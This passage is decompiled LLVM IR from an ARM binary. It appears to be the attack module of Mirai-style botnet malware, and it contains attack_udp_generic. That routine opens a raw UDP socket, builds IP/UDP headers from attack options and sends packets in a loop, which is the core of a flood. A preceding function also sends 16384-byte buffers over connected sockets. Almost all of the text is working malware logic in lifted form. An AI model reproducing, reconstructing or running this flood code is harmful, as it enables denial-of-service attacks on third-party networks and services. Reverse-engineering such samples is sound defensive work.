  store i32 %v1_cbb4, i32* %r0.global-to-local, align 4
  %v5_cbc8 = call i32 @llvm.bswap.i32(i32 %v8_cbb0)
  store i32 %v5_cbc8, i32* %r3.global-to-local, align 4
  %v2_cbcc = add i32 %v0_cba4, 4
  %v3_cbcc = inttoptr i32 %v2_cbcc to i32*
  store i32 %v5_cbc8, i32* %v3_cbcc, align 4
  %v0_cbd0 = load i32, i32* @r5, align 4
  %v0_cbd4 = load i32, i32* @r6, align 4
  %v1_cbd4 = load i32, i32* @sb, align 4
  %v2_cbd4 = add i32 %v1_cbd4, %v0_cbd4
  %v3_cbd4 = inttoptr i32 %v2_cbd4 to i32*
  %v4_cbd4 = load i32, i32* %v3_cbd4, align 4
  store i32 %v4_cbd4, i32* %r0.global-to-local, align 4
  %v3_cbdc = call i32 @__libc_connect(i32 %v4_cbd4, i32 %v0_cbd0, i32 16)
  store i32 %v3_cbdc, i32* %r0.global-to-local, align 4
  %v0_cbe0 = load i32, i32* @sl, align 4
  %v1_cbe0 = load i32, i32* @fp, align 4
  %v9_cbe0 = icmp eq i32 %v0_cbe0, %v1_cbe0
  %v0_cbe4 = load i32, i32* @r6, align 4
  %v1_cbe4 = add i32 %v0_cbe4, 4
  store i32 %v1_cbe4, i32* @r6, align 4
  br i1 %v9_cbe0, label %dec_label_pc_cbec, label %dec_label_pc_cb3c

dec_label_pc_cbec:                                ; preds = %dec_label_pc_cb8c, %dec_label_pc_cb20, %dec_label_pc_cab4
  %v1_cbf021 = phi i32 [ 0, %dec_label_pc_cab4 ], [ %v0_cbe0, %dec_label_pc_cb8c ], [ %v0_cb30, %dec_label_pc_cb20 ]
  store i32 0, i32* @r5, align 4
  %v2_cc24 = icmp eq i32 %v1_ca70, 0
  br label %dec_label_pc_cbf0

dec_label_pc_cbf0:                                ; preds = %dec_label_pc_cbf0.backedge, %dec_label_pc_cbec
  %v1_cbf0 = phi i32 [ %v1_cbf0.pre, %dec_label_pc_cbf0.backedge ], [ %v1_cbf021, %dec_label_pc_cbec ]
  %v1_cc28 = phi i32 [ %v0_cbf019, %dec_label_pc_cbf0.backedge ], [ 0, %dec_label_pc_cbec ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v5_cbf8 = icmp slt i32 %v1_cc28, %v1_cbf0
  br i1 %v5_cbf8, label %dec_label_pc_cc1c, label %dec_label_pc_cbfc

dec_label_pc_cbfc:                                ; preds = %dec_label_pc_cbf0
  %v2_cbfc = call i32 @__GI_time(i32* null)
  store i32 %v2_cbfc, i32* %r0.global-to-local, align 4
  store i32 %v0_caa810, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v6_cc0c = icmp slt i32 %v0_caa810, %v2_cbfc
  br i1 %v6_cc0c, label %dec_label_pc_cc10, label %dec_label_pc_cbf0.backedge

dec_label_pc_cc10.loopexit14:                     ; preds = %dec_label_pc_cacc
  %v1_cc18.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cc10

dec_label_pc_cc10:                                ; preds = %dec_label_pc_cbfc, %dec_label_pc_cc10.loopexit14
  %v1_cc18 = phi i32 [ %v1_cc18.pre, %dec_label_pc_cc10.loopexit14 ], [ %v2_cbfc, %dec_label_pc_cbfc ]
  ret i32 %v1_cc18

dec_label_pc_cc1c:                                ; preds = %dec_label_pc_cbf0
  store i32 %v2_c9e0, i32* %r3.global-to-local, align 4
  %v4_cc28 = mul i32 %v1_cc28, 4
  %v5_cc28 = add i32 %v4_cc28, %v2_c9e0
  %v6_cc28 = inttoptr i32 %v5_cc28 to i32*
  %v7_cc28 = load i32, i32* %v6_cc28, align 4
  store i32 %v7_cc28, i32* @r4, align 4
  br i1 %v2_cc24, label %dec_label_pc_cc30, label %dec_label_pc_cc4c

dec_label_pc_cc30:                                ; preds = %dec_label_pc_cc1c, %dec_label_pc_cc4c
  %v0_cc34 = phi i32 [ %v7_cc28, %dec_label_pc_cc1c ], [ %v0_cc34.pre, %dec_label_pc_cc4c ]
  %v1_cc30 = phi i32 [ %v1_cc28, %dec_label_pc_cc1c ], [ %v1_cc30.pre, %dec_label_pc_cc4c ]
  %v0_cc30 = load i32, i32* @sb, align 4
  %v4_cc30 = mul i32 %v1_cc30, 4
  %v5_cc30 = add i32 %v4_cc30, %v0_cc30
  %v6_cc30 = inttoptr i32 %v5_cc30 to i32*
  %v7_cc30 = load i32, i32* %v6_cc30, align 4
  store i32 %v7_cc30, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_cc40 = call i32 @__libc_send(i32 %v7_cc30, i32 %v0_cc34, i32 %v3_ca54, i32 16384)
  store i32 %v4_cc40, i32* %r0.global-to-local, align 4
  %v0_cc44 = load i32, i32* @r5, align 4
  %v1_cc44 = add i32 %v0_cc44, 1
  store i32 %v1_cc44, i32* @r5, align 4
  br label %dec_label_pc_cbf0.backedge

dec_label_pc_cbf0.backedge:                       ; preds = %dec_label_pc_cc30, %dec_label_pc_cbfc
  %v0_cbf019 = phi i32 [ %v1_cc44, %dec_label_pc_cc30 ], [ 0, %dec_label_pc_cbfc ]
  %v1_cbf0.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_cbf0

dec_label_pc_cc4c:                                ; preds = %dec_label_pc_cc1c
  store i32 %v7_cc28, i32* %r0.global-to-local, align 4
  %v2_cc54 = call i32 @rand_alphastr(i32 %v7_cc28, i32 %v3_ca54)
  store i32 %v2_cc54, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_cc60 = load i32, i32* @r4, align 4
  %v4_cc60 = add i32 %v3_cc60, %v3_ca54
  %v5_cc60 = inttoptr i32 %v4_cc60 to i8*
  store i8 0, i8* %v5_cc60, align 1
  %v1_cc30.pre = load i32, i32* @r5, align 4
  %v0_cc34.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc30

dec_label_pc_cc68:                                ; preds = %entry
  %v1_caa012 = load i32, i32* @r7, align 4
  %v2_caa013 = add i32 %v1_caa012, %v2_ca8c
  store i32 %v2_caa013, i32* %r0.global-to-local, align 4
  %v0_cc68 = call i32 @rand_next()
  %v3_cc70 = urem i32 %v0_cc68, 65536
  store i32 %v3_cc70, i32* %r0.global-to-local, align 4
  %extract.t59 = trunc i32 %v0_cc68 to i16
  br label %dec_label_pc_cab4

; uselistorder directives
  uselistorder i32 %v0_cc68, { 1, 0 }
  uselistorder i32 %v2_caa013, { 1, 0 }
  uselistorder i32 %v7_cc28, { 2, 1, 0, 3 }
  uselistorder i32 %v5_cbc8, { 1, 0 }
  uselistorder i32 %v0_cb78, { 1, 0 }
  uselistorder i32 %v0_cb50, { 2, 0, 1 }
  uselistorder i32 %v3_cad8, { 1, 0, 2 }
  uselistorder i32 %v0_caa810, { 1, 0 }
  uselistorder i32 %v4_ca9c, { 1, 0 }
  uselistorder i32 %v3_ca54, { 2, 1, 0 }
  uselistorder i32 %v2_c9e0, { 0, 2, 1 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 10, 11, 8, 9, 12, 14, 13, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 18, 8, 7, 11, 9, 10, 12, 13, 23, 21, 15, 14, 16, 19, 20, 17, 22, 25, 24, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cc30, { 1, 0 }
  uselistorder label %dec_label_pc_cc10, { 1, 0 }
  uselistorder label %dec_label_pc_cacc, { 1, 0 }
  uselistorder label %dec_label_pc_cab4, { 1, 0 }
}

define i32 @attack_udp_generic(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_cc7c = load i32, i32* @lr, align 4
  store i32 0, i32* @r8, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_cca8 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_ccac = load i32, i32* @r4, align 4
  store i32 %v0_ccac, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_ccb8 = load i32, i32* @r8, align 4
  store i32 %v0_ccb8, i32* %r3.global-to-local, align 4
  %v0_ccbc = load i32, i32* @r5, align 4
  store i32 %v0_ccbc, i32* %r0.global-to-local, align 4
  %v5_ccc0 = inttoptr i32 %v0_ccac to i32*
  %v6_ccc0 = call i32 @attack_get_opt_int(i32 %v0_ccbc, i32* %v5_ccc0, i32 2, i32 %v0_ccb8)
  %v1_cccc = urem i32 %v6_ccc0, 256
  store i32 %v1_cccc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_ccd8 = load i32, i32* @r4, align 4
  store i32 %v0_ccd8, i32* %r1.global-to-local, align 4
  %v0_ccdc = load i32, i32* @r5, align 4
  store i32 %v0_ccdc, i32* %r0.global-to-local, align 4
  %v5_cce0 = trunc i32 %v6_ccc0 to i8
  %v6_cce4 = inttoptr i32 %v0_ccd8 to i32*
  %v7_cce4 = call i32 @attack_get_opt_int(i32 %v0_ccdc, i32* %v6_cce4, i32 3, i32 65535)
  %v0_cce8 = load i32, i32* @r4, align 4
  store i32 %v0_cce8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_ccf8 = load i32, i32* @r5, align 4
  store i32 %v0_ccf8, i32* %r0.global-to-local, align 4
  %v5_ccfc = inttoptr i32 %v0_cce8 to i32*
  %v6_ccfc = call i32 @attack_get_opt_int(i32 %v0_ccf8, i32* %v5_ccfc, i32 4, i32 64)
  %v1_cd04 = urem i32 %v6_ccfc, 256
  store i32 %v1_cd04, i32* %ip.global-to-local, align 4
  %v0_cd08 = load i32, i32* @r4, align 4
  store i32 %v0_cd08, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_cd10 = load i32, i32* @r8, align 4
  store i32 %v0_cd10, i32* %r3.global-to-local, align 4
  %v0_cd14 = load i32, i32* @r5, align 4
  store i32 %v0_cd14, i32* %r0.global-to-local, align 4
  %v5_cd18 = trunc i32 %v6_ccfc to i8
  %v6_cd1c = inttoptr i32 %v0_cd08 to i32*
  %v7_cd1c = call i32 @attack_get_opt_int(i32 %v0_cd14, i32* %v6_cd1c, i32 5, i32 %v0_cd10)
  %v1_cd28 = urem i32 %v7_cd1c, 256
  store i32 %v1_cd28, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_cd34 = load i32, i32* @r4, align 4
  store i32 %v0_cd34, i32* %r1.global-to-local, align 4
  %v0_cd38 = load i32, i32* @r5, align 4
  store i32 %v0_cd38, i32* %r0.global-to-local, align 4
  %v5_cd40 = inttoptr i32 %v0_cd34 to i32*
  %v6_cd40 = call i32 @attack_get_opt_int(i32 %v0_cd38, i32* %v5_cd40, i32 6, i32 65535)
  %v0_cd4c = load i32, i32* @r4, align 4
  store i32 %v0_cd4c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_cd58 = load i32, i32* @r5, align 4
  store i32 %v0_cd58, i32* %r0.global-to-local, align 4
  %v5_cd5c = inttoptr i32 %v0_cd4c to i32*
  %v6_cd5c = call i32 @attack_get_opt_int(i32 %v0_cd58, i32* %v5_cd5c, i32 7, i32 65535)
  %v0_cd60 = load i32, i32* @r4, align 4
  store i32 %v0_cd60, i32* %r1.global-to-local, align 4
  %v0_cd68 = load i32, i32* @r8, align 4
  store i32 %v0_cd68, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_cd70 = load i32, i32* @r5, align 4
  store i32 %v0_cd70, i32* %r0.global-to-local, align 4
  %v5_cd74 = inttoptr i32 %v0_cd60 to i32*
  %v6_cd74 = call i32 @attack_get_opt_int(i32 %v0_cd70, i32* %v5_cd74, i32 %v0_cd68, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_cd80 = load i32, i32* @r4, align 4
  store i32 %v0_cd80, i32* %r1.global-to-local, align 4
  store i32 %v6_cd74, i32* @sl, align 4
  %v0_cd88 = load i32, i32* @r5, align 4
  store i32 %v0_cd88, i32* %r0.global-to-local, align 4
  %v4_cd8c = inttoptr i32 %v0_cd80 to i32*
  %v5_cd8c = call i32 @attack_get_opt_int(i32 %v0_cd88, i32* %v4_cd8c, i32 1, i32 1)
  %v2_cd98 = load i32, i32* @global_var_27164.91, align 4
  store i32 %v2_cd98, i32* %r3.global-to-local, align 4
  %v1_cd9c = urem i32 %v5_cd8c, 256
  store i32 %v1_cd9c, i32* %ip.global-to-local, align 4
  %v0_cda0 = load i32, i32* @r4, align 4
  store i32 %v0_cda0, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_cda8 = load i32, i32* @r5, align 4
  store i32 %v0_cda8, i32* %r0.global-to-local, align 4
  %v5_cdb0 = inttoptr i32 %v0_cda0 to i32*
  %v6_cdb0 = call i32 @attack_get_opt_int(i32 %v0_cda8, i32* %v5_cdb0, i32 24, i32 %v2_cd98)
  store i32 %v6_cdb0, i32* @sb, align 4
  %v0_cdb8 = load i32, i32* @r8, align 4
  store i32 %v0_cdb8, i32* %r0.global-to-local, align 4
  %v1_cdbc = inttoptr i32 %v0_cdb8 to i32*
  %v2_cdbc = call i32 @__GI_time(i32* %v1_cdbc)
  %v1_cdc0 = load i32, i32* @r6, align 4
  %v2_cdc0 = add i32 %v1_cdc0, %v2_cdbc
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_cdd4 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_cdd4, i32* %r0.global-to-local, align 4
  %v7_cdd8 = icmp eq i32 %v3_cdd4, -1
  store i32 %v3_cdd4, i32* @fp, align 4
  br i1 %v7_cdd8, label %dec_label_pc_d22c, label %dec_label_pc_cde4

dec_label_pc_cde4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_cdec = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_cdec, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_cdf4 = load i32, i32* @r8, align 4
  store i32 %v0_cdf4, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ce00 = call i32 @__GI_setsockopt(i32 %v3_cdd4, i32 %v0_cdf4, i32 3, i32 %v6_cdec, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ce00, i32* %r0.global-to-local, align 4
  %v7_ce04 = icmp eq i32 %v5_ce00, -1
  br i1 %v7_ce04, label %dec_label_pc_d238, label %dec_label_pc_ce0c

dec_label_pc_ce0c:                                ; preds = %dec_label_pc_cde4
  %v0_ce0c = load i32, i32* @sl, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_ce18 = urem i32 %v0_ce0c, 65536
  %v3_ce1c = icmp ugt i32 %v3_ce18, 1459
  br i1 %v3_ce1c, label %bb, label %bb40

bb:                                               ; preds = %dec_label_pc_ce0c
  br label %bb40

bb40:                                             ; preds = %dec_label_pc_ce0c, %bb
  %storemerge = phi i32 [ 1460, %bb ], [ %v3_ce18, %dec_label_pc_ce0c ]
  %v0_ce28 = phi i32 [ 1460, %bb ], [ %v3_ce18, %dec_label_pc_ce0c ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v6_cd40, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v3_ce3c = mul i32 %v6_cd5c, 65536
  store i32 %v3_ce3c, i32* %r2.global-to-local, align 4
  %v3_ce44 = urem i32 %v7_cce4, 65536
  %v3_ce48 = urem i32 %v6_cd40, 65536
  store i32 %v3_ce48, i32* %ip.global-to-local, align 4
  %v3_ce4c = urem i32 %v6_cd5c, 65536
  store i32 %v3_ce4c, i32* %r0.global-to-local, align 4
  %v2_ce50 = icmp eq i32 %arg2, 0
  %v0_ce58 = load i32, i32* @r8, align 4
  store i32 %v0_ce58, i32* %stack_var_-44, align 4
  br i1 %v2_ce50, label %.dec_label_pc_cf84.preheader_crit_edge, label %dec_label_pc_ce6c

.dec_label_pc_cf84.preheader_crit_edge:           ; preds = %bb40
  %.pre = add nuw nsw i32 %v0_ce28, 8
  %.pre10 = add nuw nsw i32 %v0_ce28, 28
  br label %dec_label_pc_cf84.preheader

dec_label_pc_ce6c:                                ; preds = %bb40
  %v1_ce74 = add nuw nsw i32 %v0_ce28, 28
  %v1_ce78 = add nuw nsw i32 %v0_ce28, 8
  %tmp41 = mul nuw nsw i32 %v3_ce48, 256
  %v3_ce88 = and i32 %tmp41, 65280
  %v3_ce90 = mul i32 %v1_ce74, 65536
  store i32 %v3_ce90, i32* @lr, align 4
  %tmp42 = udiv i32 %v6_cd40, 256
  %v4_ce98 = urem i32 %tmp42, 256
  %v5_ce98 = or i32 %v3_ce88, %v4_ce98
  store i32 %v5_ce98, i32* @sl, align 4
  store i32 %v3_ce3c, i32* %r1.global-to-local, align 4
  %tmp43 = mul i32 %v6_cd5c, 256
  %v3_ceb0 = and i32 %tmp43, 65280
  %v2_ceb4 = icmp eq i32 %v1_cd28, 0
  %tmp44 = mul nuw nsw i32 %v1_ce74, 256
  %v3_ceb8 = and i32 %tmp44, 65280
  store i32 %v3_ceb8, i32* %r3.global-to-local, align 4
  %tmp45 = mul i32 %v7_cce4, 256
  %v3_cebc = and i32 %tmp45, 65280
  store i32 %v3_cebc, i32* %r2.global-to-local, align 4
  %tmp46 = mul nuw nsw i32 %v1_ce78, 256
  %v3_cec0 = and i32 %tmp46, 65280
  store i32 %v3_cec0, i32* %ip.global-to-local, align 4
  %tmp47 = udiv i32 %v6_cd5c, 256
  %v4_cec4 = urem i32 %tmp47, 256
  %v5_cec4 = or i32 %v4_cec4, %v3_ceb0
  store i32 %v5_cec4, i32* %r0.global-to-local, align 4
  %tmp48 = udiv i32 %v7_cce4, 256
  %v4_cec8 = urem i32 %tmp48, 256
  %v5_cec8 = or i32 %v4_cec8, %v3_cebc
  store i32 %v5_cec8, i32* @r8, align 4
  %tmp49 = udiv i32 %v1_ce74, 256
  %v4_cecc = urem i32 %tmp49, 256
  %v5_cecc = or i32 %v4_cecc, %v3_ceb8
  store i32 %v5_cecc, i32* @r6, align 4
  %tmp50 = udiv i32 %v1_ce78, 256
  %v4_ced0 = urem i32 %tmp50, 256
  %v5_ced0 = or i32 %v4_ced0, %v3_cec0
  store i32 %v5_ced0, i32* @r5, align 4
  %v5_ced4 = trunc i32 %v5_cec4 to i16
  store i32 0, i32* @r4, align 4
  br i1 %v2_ceb4, label %dec_label_pc_cee0.preheader, label %dec_label_pc_d16c.preheader

dec_label_pc_d16c.preheader:                      ; preds = %dec_label_pc_ce6c
  %v4_d1bc = sext i8 %v5_cd18 to i32
  %v4_d1fc = sext i16 %v5_ced4 to i32
  br label %dec_label_pc_d16c

dec_label_pc_cee0.preheader:                      ; preds = %dec_label_pc_ce6c
  %v4_cf58 = sext i16 %v5_ced4 to i32
  br label %dec_label_pc_cee0

dec_label_pc_cee0:                                ; preds = %dec_label_pc_cee0.preheader, %dec_label_pc_cee0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_ceec = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_ceec, i32* %r0.global-to-local, align 4
  store i32 %v2_cca8, i32* %r2.global-to-local, align 4
  %v2_cef8 = load i32, i32* @r4, align 4
  %v5_cef8 = mul i32 %v2_cef8, 4
  %v6_cef8 = add i32 %v5_cef8, %v2_cca8
  %v7_cef8 = inttoptr i32 %v6_cef8 to i32*
  store i32 %v2_ceec, i32* %v7_cef8, align 4
  %v3_cefc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_cefc, i32* %r1.global-to-local, align 4
  %v0_cf00 = load i32, i32* %r2.global-to-local, align 4
  %v4_cf00 = mul i32 %v3_cefc, 4
  %v5_cf00 = add i32 %v0_cf00, %v4_cf00
  %v6_cf00 = inttoptr i32 %v5_cf00 to i32*
  %v7_cf00 = load i32, i32* %v6_cf00, align 4
  store i32 %v7_cf00, i32* %r3.global-to-local, align 4
  %v1_cf04 = inttoptr i32 %v7_cf00 to i8*
  %v2_cf04 = load i8, i8* %v1_cf04, align 1
  %tmp = urem i8 %v2_cf04, 16
  %v1_cf08 = zext i8 %tmp to i32
  %v1_cf0c = or i32 %v1_cf08, 64
  store i32 %v1_cf0c, i32* %r2.global-to-local, align 4
  %v1_cf10 = trunc i32 %v1_cf0c to i8
  store i8 %v1_cf10, i8* %v1_cf04, align 1
  %v0_cf14 = load i32, i32* %r3.global-to-local, align 4
  %v1_cf14 = inttoptr i32 %v0_cf14 to i8*
  %v2_cf14 = load i8, i8* %v1_cf14, align 1
  %v1_cf18 = and i8 %v2_cf14, -16
  %v1_cf1c = or i8 %v1_cf18, 5
  store i32 17, i32* %ip.global-to-local, align 4
  store i8 %v1_cf1c, i8* %v1_cf14, align 1
  %v0_cf28 = load i32, i32* %ip.global-to-local, align 4
  %v1_cf28 = trunc i32 %v0_cf28 to i8
  %v2_cf28 = load i32, i32* %r3.global-to-local, align 4
  %v3_cf28 = add i32 %v2_cf28, 9
  %v4_cf28 = inttoptr i32 %v3_cf28 to i8*
  store i8 %v1_cf28, i8* %v4_cf28, align 1
  %v2_cf30 = load i32, i32* %r3.global-to-local, align 4
  %v3_cf30 = add i32 %v2_cf30, 1
  %v4_cf30 = inttoptr i32 %v3_cf30 to i8*
  store i8 %v5_cce0, i8* %v4_cf30, align 1
  %v0_cf38 = load i32, i32* %r1.global-to-local, align 4
  %v3_cf38 = mul i32 %v0_cf38, 32
  store i32 %v3_cf38, i32* %r0.global-to-local, align 4
  %v2_cf3c = load i32, i32* %r3.global-to-local, align 4
  %v3_cf3c = add i32 %v2_cf3c, 8
  %v4_cf3c = inttoptr i32 %v3_cf3c to i8*
  store i8 %v5_cd18, i8* %v4_cf3c, align 1
  %v0_cf40 = load i32, i32* @sb, align 4
  %v1_cf40 = load i32, i32* %r3.global-to-local, align 4
  %v2_cf40 = add i32 %v1_cf40, 12
  %v3_cf40 = inttoptr i32 %v2_cf40 to i32*
  store i32 %v0_cf40, i32* %v3_cf40, align 4
  %v0_cf44 = load i32, i32* %r0.global-to-local, align 4
  %v1_cf44 = load i32, i32* %r1.global-to-local, align 4
  %tmp52 = mul i32 %v1_cf44, -8
  %v5_cf44 = add i32 %v0_cf44, %tmp52
  %v1_cf48 = load i32, i32* @r7, align 4
  %v2_cf48 = add i32 %v5_cf44, %v1_cf48
  store i32 %v2_cf48, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v1_cf50 = add i32 %v1_cf44, 1
  store i32 %v1_cf50, i32* @r4, align 4
  %v1_cf54 = add i32 %v2_cf48, 16
  %v2_cf54 = inttoptr i32 %v1_cf54 to i32*
  %v3_cf54 = load i32, i32* %v2_cf54, align 4
  store i32 %v3_cf54, i32* %r2.global-to-local, align 4
  store i32 %v4_cf58, i32* %r0.global-to-local, align 4
  %v0_cf5c = load i32, i32* %r3.global-to-local, align 4
  %v1_cf5c = add i32 %v0_cf5c, 20
  store i32 %v1_cf5c, i32* %r1.global-to-local, align 4
  %v0_cf64 = load i32, i32* @r6, align 4
  %v1_cf64 = trunc i32 %v0_cf64 to i16
  %v3_cf64 = add i32 %v0_cf5c, 2
  %v4_cf64 = inttoptr i32 %v3_cf64 to i16*
  store i16 %v1_cf64, i16* %v4_cf64, align 2
  %v0_cf68 = load i32, i32* @r8, align 4
  %v1_cf68 = trunc i32 %v0_cf68 to i16
  %v2_cf68 = load i32, i32* %r3.global-to-local, align 4
  %v3_cf68 = add i32 %v2_cf68, 4
  %v4_cf68 = inttoptr i32 %v3_cf68 to i16*
  store i16 %v1_cf68, i16* %v4_cf68, align 2
  %v0_cf6c = load i32, i32* %r2.global-to-local, align 4
  %v1_cf6c = load i32, i32* %r3.global-to-local, align 4
  %v2_cf6c = add i32 %v1_cf6c, 16
  %v3_cf6c = inttoptr i32 %v2_cf6c to i32*
  store i32 %v0_cf6c, i32* %v3_cf6c, align 4
  %v0_cf70 = load i32, i32* @sl, align 4
  %v1_cf70 = trunc i32 %v0_cf70 to i16
  %v2_cf70 = load i32, i32* %r3.global-to-local, align 4
  %v3_cf70 = add i32 %v2_cf70, 20
  %v4_cf70 = inttoptr i32 %v3_cf70 to i16*
  store i16 %v1_cf70, i16* %v4_cf70, align 2
  %v0_cf74 = load i32, i32* @r5, align 4
  %v1_cf74 = trunc i32 %v0_cf74 to i16
  %v2_cf74 = load i32, i32* %r1.global-to-local, align 4
  %v3_cf74 = add i32 %v2_cf74, 4
  %v4_cf74 = inttoptr i32 %v3_cf74 to i16*
  store i16 %v1_cf74, i16* %v4_cf74, align 2
  %v0_cf78 = load i32, i32* %r0.global-to-local, align 4
  %v1_cf78 = trunc i32 %v0_cf78 to i16
  %v2_cf78 = load i32, i32* %r1.global-to-local, align 4
  %v3_cf78 = add i32 %v2_cf78, 2
  %v4_cf78 = inttoptr i32 %v3_cf78 to i16*
  store i16 %v1_cf78, i16* %v4_cf78, align 2
  %v0_cf7c = load i32, i32* @r4, align 4
  store i32 %v0_cf7c, i32* %stack_var_-44, align 4
  %v5_cf80 = icmp slt i32 %v1_cf50, %arg2
  br i1 %v5_cf80, label %dec_label_pc_cee0, label %dec_label_pc_cf84.preheader

dec_label_pc_cf84.preheader:                      ; preds = %dec_label_pc_d16c, %dec_label_pc_cee0, %.dec_label_pc_cf84.preheader_crit_edge
  %v1_cfa4.pre-phi = phi i32 [ %.pre10, %.dec_label_pc_cf84.preheader_crit_edge ], [ %v1_ce74, %dec_label_pc_cee0 ], [ %v1_ce74, %dec_label_pc_d16c ]
  %v1_cfa0.pre-phi = phi i32 [ %.pre, %.dec_label_pc_cf84.preheader_crit_edge ], [ %v1_ce78, %dec_label_pc_cee0 ], [ %v1_ce78, %dec_label_pc_d16c ]
  %v3_d104 = icmp eq i32 %v3_ce44, 65535
  %v2_d140 = icmp eq i32 %v1_cd9c, 0
  br label %dec_label_pc_cf84

dec_label_pc_cf84:                                ; preds = %dec_label_pc_cf84.preheader, %dec_label_pc_d218
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ce50, label %dec_label_pc_d218, label %dec_label_pc_cf98

dec_label_pc_cf98:                                ; preds = %dec_label_pc_cf84
  store i32 %v0_ce28, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_cfa0.pre-phi, i32* @sl, align 4
  store i32 %v1_cfa4.pre-phi, i32* @r8, align 4
  br label %dec_label_pc_d074

dec_label_pc_cfac:                                ; preds = %dec_label_pc_d074
  %v0_cfac = load i32, i32* @sb, align 4
  %v7_cfac = icmp eq i32 %v0_cfac, -1
  br i1 %v7_cfac, label %dec_label_pc_d0f4, label %dec_label_pc_cfb4

dec_label_pc_cfb4:                                ; preds = %dec_label_pc_d098, %dec_label_pc_cfac
  store i32 %v3_ce44, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  br i1 %v3_d104, label %dec_label_pc_d110, label %dec_label_pc_cfc8

dec_label_pc_cfc8:                                ; preds = %dec_label_pc_d0f4.dec_label_pc_cfc8_crit_edge, %dec_label_pc_cfb4
  %v1_cfcc = phi i32 [ %v1_cfcc.pre, %dec_label_pc_d0f4.dec_label_pc_cfc8_crit_edge ], [ 65535, %dec_label_pc_cfb4 ]
  store i32 %v3_ce48, i32* %r0.global-to-local, align 4
  %v9_cfcc = icmp eq i32 %v3_ce48, %v1_cfcc
  br i1 %v9_cfcc, label %dec_label_pc_d124, label %dec_label_pc_cfd4

dec_label_pc_cfd4:                                ; preds = %dec_label_pc_d110, %dec_label_pc_cfc8
  %v1_cfd8 = phi i32 [ %v1_d11c, %dec_label_pc_d110 ], [ %v1_cfcc, %dec_label_pc_cfc8 ]
  store i32 %v3_ce4c, i32* %r1.global-to-local, align 4
  %v9_cfd8 = icmp eq i32 %v3_ce4c, %v1_cfd8
  br i1 %v9_cfd8, label %dec_label_pc_d138, label %dec_label_pc_cfe0

dec_label_pc_cfe0:                                ; preds = %dec_label_pc_d124, %dec_label_pc_cfd4
  store i32 %v1_cd9c, i32* %r2.global-to-local, align 4
  br i1 %v2_d140, label %dec_label_pc_cfec, label %dec_label_pc_d14c

